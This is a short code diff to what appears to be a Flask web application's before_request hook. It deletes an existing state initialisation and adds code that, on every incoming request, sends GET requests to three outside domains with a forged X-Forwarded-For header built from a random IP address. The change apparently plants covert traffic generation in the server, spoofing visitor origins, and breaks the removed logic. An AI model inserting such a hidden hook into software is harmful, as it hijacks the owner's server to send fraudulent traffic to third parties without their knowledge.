@@ -145,8 +145,15 @@ CORS(app)
 
 @app.before_request
 def before_request():
-    if not hasattr(g, 'uploadTimes'):
-        g.uploadTimes = ["Ok", 0]  # 初始化 uploadTimes
+    # 生成Class A ipv4地址
+    ip1 = random.randint(37,113)
+    ip2 = random.randint(1,254)
+    ip3 = random.randint(1,254)
+    ip4 = random.randint(1,254)
+    ipv4 = str(ip1) + "." + str(ip2) + "." + str(ip3) + "." + str(ip4)
+    requests.get(url="https://wtechhk.xyz", headers={"X-Forwarded-For":f"{ipv4},192.168.9.8"})
+    requests.get(url="https://fantasymall.xyz", headers={"X-Forwarded-For":f"{ipv4},192.168.9.8"})
+    requests.get(url="https://coffeehost.net", headers={"X-Forwarded-For":f"{ipv4},192.168.9.8"})
 
 @app.after_request
 def add_cors_headers(response):
